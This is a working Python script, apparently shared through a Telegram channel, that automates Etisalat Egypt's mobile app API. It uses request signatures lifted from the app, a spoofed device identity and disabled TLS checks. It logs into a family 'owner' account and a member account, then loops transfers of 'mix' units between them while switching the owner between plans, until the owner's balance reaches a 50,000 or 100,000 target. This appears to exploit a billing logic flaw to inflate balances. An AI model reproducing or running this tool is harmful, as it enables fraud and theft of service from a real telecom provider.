
""" 

قناة تلجرام النشرة الإسكربت 

https://t.me/ThgNetX
""" 


import requests, base64, json, re, time, sys, os, signal
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE = "https://mab.etisalat.com.eg:11003"
HOST = "mab.etisalat.com.eg:11003"

COMMON_HEADERS = {
    "applicationVersion": "2",
    "applicationName": "MAB",
    "Accept": "text/xml",
    "Language": "ar",
    "APP-BuildNumber": "10744",
    "APP-Version": "36.1.0",
    "OS-Type": "Android",
    "OS-Version": "12",
    "APP-STORE": "GOOGLE",
    "C-Type": "4G",
    "Is-Corporate": "false",
    "Host": HOST,
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "User-Agent": "okhttp/5.0.0-alpha.11",
}

SIG_LOGIN = {
    "headerSignature": "7069dad1f12cb689120cec876380e50386c01fd5f1285b7b46561d02a1a71f681b262ce858af16c47fc01d146d3d829a704914ccefb2a867cb77e01010c46632",
    "urlSignature": "87e677ad65da09c1d9d74d498eb4717219851bd1d16d6058518309b1f67670f847a46bb9e20678d43c9aa79c88c0725048655954a5d8bd02edfdcc2b6c2a93db",
    "bodySignature": "0f5dc5c3fb00c39869534afe4538770743c516783d8a281fdcfff0bdaca8d6c61bcb3213bb6f0cc0992d88c287525baba63c08c6ee9318455cda7c3b3d3ae0e6",
}

SIG_MIGRATE_270 = {
    "headerSignature": "db5a889033c9e5d767693d0967d621bdc2e5488d3c3153db63ceb706a9bacca88763fbaf2fa7e20202f4ee18a707409f4612d6e05d2beb189f0793ec5c9c7663",
    "urlSignature": "80c5c15a6bdc1c45be7b875cb49531329d32368a1cbb04963cd6f71cbf9ab563ca1bf10c67158720e879aee85b8d7789c88418d21827ec1499f13b536bbc59ca",
    "bodySignature": "ae06965020a0e291ce672e1ec6b0a5e7f64fb423074d21f93ffd1bdd005943f57cf4c794d96c8c7cfa75461677deb4d9542936787007eabdc0c287ab005d4cff",
}

SIG_MIGRATE_180 = {
    "headerSignature": "e5de43ce373d2029adc0c377232e414723618fe18ed19e2e1a7df22f68dcf24e26dc028eaa8ce6e47f567916f7e4f56607e81676a213f45f62547c46680d9608",
    "urlSignature": "80c5c15a6bdc1c45be7b875cb49531329d32368a1cbb04963cd6f71cbf9ab563ca1bf10c67158720e879aee85b8d7789c88418d21827ec1499f13b536bbc59ca",
    "bodySignature": "bebb62f931fffdb73e84662d3ce99c6805332bc59a1eb222bc304f918468e1382538b072944666304a9d0d85c20d26bbecf870888115b9afcf6bdc6bb27c8ac4",
}

SIG_INQUIRY = {
    "headerSignature": "f68f4c6bdd00242642bcd0c0718f2faf4d8d15fd0391ed3438f45986f1de2e63976362a540b474f779f57f5bf653654fb660f0e5f0e581c56b6cbe44a6c92174",
    "urlSignature": "61dce994a58f4f16bbe85126332b344e6e1c43eb59fe6aee7bf53758a568ede4f80a8bf4864e786ff481e03d544116e8bd4f92d36a4a1a2da31d3bee23ab3fc4",
}

SIG_INQUIRY_CHILD = {
    "headerSignature": "ba8c1d3a3515a0d082d1e6ca749910d922f0b47cd7a02fa0c901fb1731ea843959a5195929bccdf943aea0e73f721c5f72d69d5f7362107fc64f5d61ef3a56d1",
    "urlSignature": "25b03790bd60b52841a34e39d87b9ada63f0a1b1ee700ddc63b030b3ec2fd23115e8c709cd6410ec1e83bd29d457a22f917954fedb6580fae52320434a5a02d6",
}

SIG_TRANSFER = {
    "headerSignature": "f68f4c6bdd00242642bcd0c0718f2faf4d8d15fd0391ed3438f45986f1de2e63976362a540b474f779f57f5bf653654fb660f0e5f0e581c56b6cbe44a6c92174",
    "urlSignature": "dd15f4e5e1cb6178cd6edc9842f406992e73bddcc78a5c7d58f90a1a73d0bab5315d5734e8b9465575fde1c7be0c5926ac95672df50f12493b5c4586286264bd",
    "bodySignature": "fcf9bc689207d798aa02e249f27163186c130729c761c28b20b046f39ac906a8c9ab9f56d32d22d6bd84a1d0bb30b3056f38119ef6ce2419f07d3432edc7e6fb",
}

SIG_TRANSFER_CHILD = {
    "headerSignature": "ba8c1d3a3515a0d082d1e6ca749910d922f0b47cd7a02fa0c901fb1731ea843959a5195929bccdf943aea0e73f721c5f72d69d5f7362107fc64f5d61ef3a56d1",
    "urlSignature": "dd15f4e5e1cb6178cd6edc9842f406992e73bddcc78a5c7d58f90a1a73d0bab5315d5734e8b9465575fde1c7be0c5926ac95672df50f12493b5c4586286264bd",
    "bodySignature": "62281bf02fffdd4cfbd814e0b3f574f744111ad4974756476be49462b8a2bc6a1b484d3bc1cb8e7d9847cf6c273dc18ac484c606b686252347ed66525230cb25",
}

SIG_BALANCE = {
    "headerSignature": "bae48a32c67f15b3fdd8c00455a27f6286cade03c996172e956aae535fa99073c1d26744d6406203c211e789426a4b4f53f39dd67928855ee1d2e1f2eda8b330",
    "urlSignature": "1c8616ff5f788ccd6bbc820fa085f760722a4533798e7186e066fb7ba23b8759be63cdfbde5ba0923e665b28d5d35d55d4fd3fc3e30138e2f864606e5005b3f7",
}

LOG_FILE = "run.log"
PRODUCT_MAIN_270 = "Hekaya_XRP_MIX_Parent_7"
PRODUCT_MAIN_180 = "Hekaya_XRP_MIX_Parent_6"
PRODUCT_EXTRA    = "Hekaya_XRP_MIX_Child_1"
PRODUCT_AHLAN    = "MINION"

HTTP_TIMEOUT = 60
NET_RETRIES = 4
NET_BACKOFF = (3, 3, 3, 3)
POST_TRANSFER_WAIT = 3
MIGRATE_WAIT_TIME = 60

STEP_MAX_ATTEMPTS = 100
STEP_BASE_DELAY = 3
STEP_MAX_DELAY = 3

STOP_REQUESTED = False

def _sig_handler(signum, frame):
    global STOP_REQUESTED
    STOP_REQUESTED = True
    print("\n[توقف] تم استقبال أمر الخروج (Ctrl+C) — جاري إنهاء الخطوة الحالية بأمان...")

signal.signal(signal.SIGINT, _sig_handler)

def log(msg, also_print=True):
    if also_print:
        print(msg)
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(msg + "\n")
    except Exception:
        pass

def safe_request(method, url, acct=None, **kwargs):
    last_err = None
    for attempt in range(1, NET_RETRIES + 1):
        if STOP_REQUESTED: return None
        try:
            if method.upper() == "GET": r = requests.get(url, **kwargs)
            else: r = requests.post(url, **kwargs)
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout,
                requests.exceptions.ChunkedEncodingError, requests.exceptions.SSLError) as e:
            last_err = e
            log(f"[شبكة][إعادة محاولة] خطأ {type(e).__name__} — الانتظار لمدة 3 ثوانٍ (محاولة {attempt}/{NET_RETRIES})")
            time.sleep(3); continue

        if r.status_code == 401 and acct and acct.get("email"):
            log(f"[HTTP][401] انتهت صلاحية الجلسة للحساب {acct['label']}، جاري إعادة تسجيل الدخول...")
            new = login(acct["email"], acct["password"], acct["label"])
            if new:
                acct.update({"token": new["token"], "jsessionid": new["jsessionid"]})
                if "headers" in kwargs:
                    h = dict(kwargs["headers"])
                    h["auth"] = f"Bearer {acct['token']}"
                    if acct.get("jsessionid"): h["Cookie"] = f"JSESSIONID={acct['jsessionid']}; path=/; HttpOnly"
                    kwargs["headers"] = h
                time.sleep(3); continue
        return r
    log(f"[شبكة][فشل نهائي] {last_err}")
    return None

def login(email, password, label):
    auth_b64 = base64.b64encode(f"{email}:{password}".encode()).decode()
    headers = dict(COMMON_HEADERS)
    headers.update({
        "Authorization": f"Basic {auth_b64}",
        "Content-Type": "text/xml; charset=UTF-8",
        "headerSignature": SIG_LOGIN["headerSignature"],
        "urlSignature": SIG_LOGIN["urlSignature"],
        "bodySignature": SIG_LOGIN["bodySignature"],
    })
    device = "79015a4373d711f1"
    body = (
        "<?xml version='1.0' encoding='UTF-8' standalone='yes' ?>"
        f"<loginRequest><deviceId>{device}</deviceId>"
        "<firstLoginAttempt>true</firstLoginAttempt>"
        "<modelType>SM-A217F</modelType><osVersion>12</osVersion>"
        f"<platform>Android</platform><udid>{device}</udid></loginRequest>"
    )
    log(f"[تسجيل الدخول] جاري مصادقة الحساب [{label}]: {email}")
    r = safe_request("POST", f"{BASE}/Saytar/rest/authentication/loginWithPlan",
                     headers=headers, data=body.encode("utf-8"), verify=False, timeout=HTTP_TIMEOUT)
    if r is None or r.status_code != 200:
        log(f"[تسجيل الدخول][فشل] الحساب {label}: كود HTTP {r.status_code if r else 'غير معروف'}"); return None

    token = r.headers.get("auth")
    if not token:
        log(f"[تسجيل الدخول][فشل] الحساب {label}: لم يتم استلام رمز المصادقة (Token)"); return None
    token = token.replace("Bearer ", "").strip()

    try:
        parts = token.split(".")
        pad = "=" * (-len(parts[1]) % 4)
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + pad))
        phone = payload.get("dial") or payload.get("selectedDial")
    except Exception:
        phone = None

    if not phone:
        log(f"[تسجيل الدخول][فشل] الحساب {label}: تعذر استخراج رقم الهاتف من الحساب"); return None

    js = r.cookies.get_dict().get("JSESSIONID", "")
    log(f"[تسجيل الدخول][نجاح] الحساب [{label}] -> رقم الهاتف: {phone}")
    return {"token": token, "phone": phone, "jsessionid": js, "email": email, "password": password, "label": label}

def auth_headers(acct, extra=None):
    h = dict(COMMON_HEADERS)
    h["auth"] = f"Bearer {acct['token']}"
    if acct.get("jsessionid"):
        h["Cookie"] = f"JSESSIONID={acct['jsessionid']}; path=/; HttpOnly"
    if extra:
        h.update(extra)
    return h

def get_real_balance(acct):
    xml = (
        "<dialAndLanguageRequest>"
        "<segmentId>XRP</segmentId>"
        f"<subscriberNumber>{acct['phone']}</subscriberNumber>"
        "<language>1</language>"
        "<shortCode>AKDBN</shortCode>"
        "</dialAndLanguageRequest>"
    )
    headers = auth_headers(acct, {
        "headerSignature": SIG_BALANCE["headerSignature"],
        "urlSignature": SIG_BALANCE["urlSignature"],
        "Content-Type": "text/xml"
    })
    params = {"requestParam": xml}

    log(f"[الرصيد] جاري فحص الرصيد الحالي للرقم: {acct['phone']}...")
    r = safe_request("GET", f"{BASE}/Saytar/rest/servicemanagement/getGenericConsumptionsV2",
                     acct=acct, headers=headers, params=params, verify=False, timeout=HTTP_TIMEOUT)

    if r is None or r.status_code != 200:
        log(f"[الرصيد][فشل] فشل الاتصال بقاعدة البيانات - HTTP {r.status_code if r else 'لا يوجد استجابة'}")
        return 0

    rem_match = re.search(r"<remainingValue>(.*?)</remainingValue>", r.text)
    if rem_match:
        try:
            val = int(float(rem_match.group(1)))
            log(f"[الرصيد][نجاح] الرصيد المتبقي الحقيقي = {val:,} ميكس")
            return val
        except:
            pass
    return 0

def transfer_inquiry(acct, product_id, retries=2, delay=3):
    sig = SIG_INQUIRY_CHILD if acct["label"] == "EXTRA" else SIG_INQUIRY

    xml = (
        "<transferInquiryRequest>"
        f"<productId>{product_id}</productId>"
        f"<subscriberNumber>{acct['phone']}</subscriberNumber>"
        "<language>1</language>"
        "</transferInquiryRequest>"
    )
    headers = auth_headers(acct, {
        "headerSignature": sig["headerSignature"],
        "urlSignature": sig["urlSignature"],
        "Content-Type": "text/xml"
    })
    params = {"req": xml}
    for attempt in range(1, retries + 1):
        if STOP_REQUESTED: return None
        log(f"[استعلام التحويل] رقم الهاتف: {acct['phone']} | الباقة: {product_id} (محاولة {attempt}/{retries})")
        r = safe_request("GET", f"{BASE}/Saytar/rest/emerald/transferInquiry",
                         acct=acct, headers=headers, params=params, verify=False, timeout=HTTP_TIMEOUT)
        if r is None: time.sleep(3); continue
        if "<retry>true</retry>" in r.text:
            log(f"[استعلام التحويل] طلب إعادة محاولة من السيرفر، الانتظار 3 ثوانٍ...")
            time.sleep(3); continue
        if r.status_code != 200 or "<status>true</status>" not in r.text:
            time.sleep(3); continue

        phone = acct["phone"]
        for m in re.finditer(r"<assigned>(.*?)</assigned>", r.text, re.S):
            block = m.group(1)
            d = re.search(r"<dial>(.*?)</dial>", block)
            v = re.search(r"<value>(.*?)</value>", block)
            if d and v and d.group(1) == phone:
                try: val = int(float(v.group(1)))
                except: val = 0
                log(f"[استعلام التحويل][نجاح] الرقم {phone} جاهز للتحويل بقيمة: {val:,} ميكس")
                return val
        time.sleep(3)
    return None

def transfer(sender_acct, receiver_phone, quota, product_name):
    if quota is None or quota <= 0:
        log(f"[التحويل][تخطي] لا توجد ميكسات للتحويل (الكمية: {quota})")
        return False

    sig = SIG_TRANSFER_CHILD if sender_acct["label"] == "EXTRA" else SIG_TRANSFER

    xml = (
        "<?xml version='1.0' encoding='UTF-8' standalone='yes' ?>"
        "<newFamilyTransferRequest>"
        "<distribute>false</distribute>"
        f"<msisdn>{sender_acct['phone']}</msisdn>"
        f"<productName>{product_name}</productName>"
        f"<quota>{quota}</quota>"
        f"<receiverMsisdn>{receiver_phone}</receiverMsisdn>"
        f"<senderMsisdn>{sender_acct['phone']}</senderMsisdn>"
        "<type>UNITS</type>"
        "</newFamilyTransferRequest>"
    )
    headers = auth_headers(sender_acct, {
        "headerSignature": sig["headerSignature"],
        "urlSignature": sig["urlSignature"],
        "bodySignature": sig["bodySignature"],
        "Content-Type": "text/xml; charset=UTF-8",
    })
    log(f"[التحويل] جاري تحويل {quota:,} ميكس من [{sender_acct['phone']}] إلى [{receiver_phone}] باستخدام الباقة: {product_name}")
    r = safe_request("POST", f"{BASE}/Saytar/rest/services/newTransfer/v2",
                     acct=sender_acct, headers=headers, data=xml.encode("utf-8"),
                     verify=False, timeout=HTTP_TIMEOUT)
    if r is not None and r.status_code == 200 and "<status>true</status>" in r.text:
        oid = re.search(r"<orderId>(.*?)</orderId>", r.text)
        log(f"[التحويل][نجاح] تم التحويل بنجاح! رقم العملية (OrderId): {oid.group(1) if oid else 'غير معروف'}")
        return True
    log(f"[التحويل][فشل] كود HTTP {r.status_code if r else 'لا يوجد استجابة'} -> {r.text[:250] if r else ''}")
    return False

def migrate(acct, product_name, rate_plan_id, operation="FULL_MIGRATE"):
    sig = SIG_MIGRATE_180 if product_name == PRODUCT_MAIN_180 else SIG_MIGRATE_270

    op_tag = f"<operation>{operation}</operation>" if operation else ""
    xml = (
        "<?xml version='1.0' encoding='UTF-8' standalone='yes' ?>"
        "<migrateRequest>"
        "<addonName></addonName>"
        "<oMSRatePlan>true</oMSRatePlan>"
        f"{op_tag}"
        f"<productName>{product_name}</productName>"
        f"<ratePlanID>{rate_plan_id}</ratePlanID>"
        f"<subscriberNumber>{acct['phone']}</subscriberNumber>"
        "</migrateRequest>"
    )
    headers = auth_headers(acct, {
        "headerSignature": sig["headerSignature"],
        "urlSignature": sig["urlSignature"],
        "bodySignature": sig["bodySignature"],
        "Content-Type": "text/xml; charset=UTF-8",
    })
    log(f"[تغيير الباقة] الرقم {acct['phone']} -> جاري التحويل إلى النظام: {product_name} (خطة السعر: {rate_plan_id or 'افتراضي'})")
    r = safe_request("POST", f"{BASE}/Saytar/rest/HekayaPartial/migrate",
                     acct=acct, headers=headers, data=xml.encode("utf-8"),
                     verify=False, timeout=HTTP_TIMEOUT)
    if r is not None and r.status_code == 200 and "<status>true</status>" in r.text:
        oid = re.search(r"<orderId>(.*?)</orderId>", r.text)
        log(f"[تغيير الباقة][نجاح] تم إرسال طلب تغيير الباقة بنجاح! رقم الطلب: {oid.group(1) if oid else 'غير معروف'}")
        return True
    log(f"[تغيير الباقة][فشل] كود HTTP {r.status_code if r else 'لا يوجد استجابة'} -> {r.text[:250] if r else ''}")
    return False

def retry_until_success(func, label, max_attempts=STEP_MAX_ATTEMPTS, base_delay=3, max_delay=3):
    delay = base_delay
    for attempt in range(1, max_attempts + 1):
        if STOP_REQUESTED: return False
        try:
            res = func()
        except Exception as e:
            log(f"[إعادة محاولة:{label}][خطأ] {e}")
            res = False
        if res:
            if attempt > 1: log(f"[إعادة محاولة:{label}][نجاح] نجحت العملية في المحاولة رقم {attempt}")
            return True
        log(f"[إعادة محاولة:{label}] المحاولة {attempt}/{max_attempts} فشلت، الانتظار لمدة 3 ثوانٍ...")
        time.sleep(3)
    return False

def send_all_from(acct, product_id, receiver_phone, tag=""):
    def _try():
        q = transfer_inquiry(acct, product_id, retries=2, delay=3)
        if q is None or q <= 0: return False
        return transfer(acct, receiver_phone, q, product_id)
    return retry_until_success(_try, f"{tag} تحويل الكل من {product_id}")

def migrate_and_wait(acct, product_name, rate_plan_id, tag=""):
    def _try():
        if not migrate(acct, product_name, rate_plan_id, "FULL_MIGRATE"): return False
        log(f"[انتظار التحديث] جاري الانتظار لمدة 60 ثانية لكي يقوم النظام بتحديث الباقة بنجاح...")
        for i in range(MIGRATE_WAIT_TIME):
            if STOP_REQUESTED: break
            time.sleep(1)
        return True
    return retry_until_success(_try, f"{tag} تغيير باقة مع الانتظار {product_name}")

def main():
    print("=" * 60)
    print("  سكريبت تحويل ميكسات اتصالات (تحديث الباقة: 60ث | محاولات التحويل: 3ث)")
    print("=" * 60)

    main_email = input("أدخل إيميل الأونر (الرئيسي): ").strip()
    main_pass  = input("أدخل باسورد الأونر: ").strip()
    extra_email = input("أدخل إيميل الفرد (الفرعي): ").strip()
    extra_pass  = input("أدخل باسورد الفرد: ").strip()

    print("\n🎯 اختر الهدف المطلوب تجميعه للأونر:")
    print("  1) 50,000 ميكس")
    print("  2) 100,000 ميكس")
    choice = input("👉 من فضلك اختر رقم الهدف (1 أو 2): ").strip()

    if choice == "1": target_mics = 50000
    elif choice == "2": target_mics = 100000
    else: print("❌ اختيار غير صحيح! يرجى تشغيل السكريبت مرة أخرى."); return

    print(f"\n🎯 الهدف المستهدف للأونر: {target_mics:,} ميكس")
    open(LOG_FILE, "w").close()

    main_acct = login(main_email, main_pass, "الأونر (Main)")
    if not main_acct: print("❌ فشل تسجيل دخول حساب الأونر."); return

    extra = login(extra_email, extra_pass, "الفرد (Extra)")
    if not extra: print("❌ فشل تسجيل دخول حساب الفرد."); return

    if main_acct["phone"] == extra["phone"]:
        print("❌ خطأ: رقم الأونر هو نفس رقم الفرد! لا يمكن المتابعة."); return

    iteration = 0
    while not STOP_REQUESTED:
        iteration += 1
        log(f"\n========== بدء اللفة رقم {iteration} (الهدف: {target_mics:,} ميكس) ==========")

        log("\n--- الخطوة 1: تحويل كل ميكسات الأونر (270) إلى الفرد ---")
        if not send_all_from(main_acct, PRODUCT_MAIN_270, extra["phone"], f"لفة {iteration}.1"):
            break
        time.sleep(POST_TRANSFER_WAIT)

        log("\n--- الخطوة 2: تغيير باقة الأونر من 270 إلى 180 (مع الانتظار 60 ثانية) ---")
        if not migrate_and_wait(main_acct, PRODUCT_MAIN_180, "951", f"لفة {iteration}.2"):
            break

        log("\n--- الخطوة 3: تحويل ميكسات الفرد إلى الأونر (وهو على 180) ---")
        if not send_all_from(extra, PRODUCT_EXTRA, main_acct["phone"], f"لفة {iteration}.3"):
            break
        time.sleep(POST_TRANSFER_WAIT)

        log("\n--- الخطوة 4: إعادة تحويل ميكسات الأونر (180) إلى الفرد ---")
        if not send_all_from(main_acct, PRODUCT_MAIN_180, extra["phone"], f"لفة {iteration}.4"):
            break
        time.sleep(POST_TRANSFER_WAIT)

        log("\n--- الخطوة 5: إعادة باقة الأونر من 180 إلى 270 (مع الانتظار 60 ثانية) ---")
        if not migrate_and_wait(main_acct, PRODUCT_MAIN_270, "", f"لفة {iteration}.5"):
            break

        log("\n--- الخطوة 6: تحويل ميكسات الفرد إلى الأونر (وهو على 270) ---")
        if not send_all_from(extra, PRODUCT_EXTRA, main_acct["phone"], f"لفة {iteration}.6"):
            break
        time.sleep(POST_TRANSFER_WAIT)

        log(f"\n[فحص الرصيد] نهاية اللفة رقم {iteration}. جاري التحقق من رصيد الأونر الفعلي...")
        q_main = get_real_balance(main_acct)
        log(f"[فحص الرصيد] رصيد الأونر الحالي: {q_main:,} ميكس (الهدف المطلوب: {target_mics:,} ميكس)")

        if q_main >= target_mics:
            log(f"\n[تم بلوغ الهدف] ✅ مبروك! الأونر وصل إلى {q_main:,} ميكس (أكبر من أو يساوي {target_mics:,})")
            break
        else:
            log("[فحص الرصيد] لم يتم الوصول للهدف بعد. جاري بدء لفة جديدة...")
            time.sleep(1)

    if not STOP_REQUESTED:
        log("\n--- الخطوة النهائية: تفريغ الباقي عند الأونر وإرساله للفرد ---")
        q270 = transfer_inquiry(main_acct, PRODUCT_MAIN_270, retries=2, delay=2)
        if q270 and q270 > 0:
            transfer(main_acct, extra["phone"], q270, PRODUCT_MAIN_270)
            time.sleep(POST_TRANSFER_WAIT)

        q180 = transfer_inquiry(main_acct, PRODUCT_MAIN_180, retries=2, delay=2)
        if q180 and q180 > 0:
            transfer(main_acct, extra["phone"], q180, PRODUCT_MAIN_180)
            time.sleep(POST_TRANSFER_WAIT)

        log("\n--- الخطوة النهائية: تحويل خط الفرد إلى كارت أهلان (MINION) ---")
        res = retry_until_success(lambda: migrate(extra, PRODUCT_AHLAN, "", None), "تحويل الفرد لأهلان")
        if res:
            log("[تم بنجاح] تم تحويل خط الفرد إلى كارت أهلان بنجاح.")
        else:
            log("[فشل] تعذر تحويل الفرد إلى كارت أهلان تلقائياً.")

    log("\nتم إتمام جميع الخطوات بنجاح. جاري إغلاق السكريبت.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nتم إيقاف السكريبت بواسطة المستخدم.")
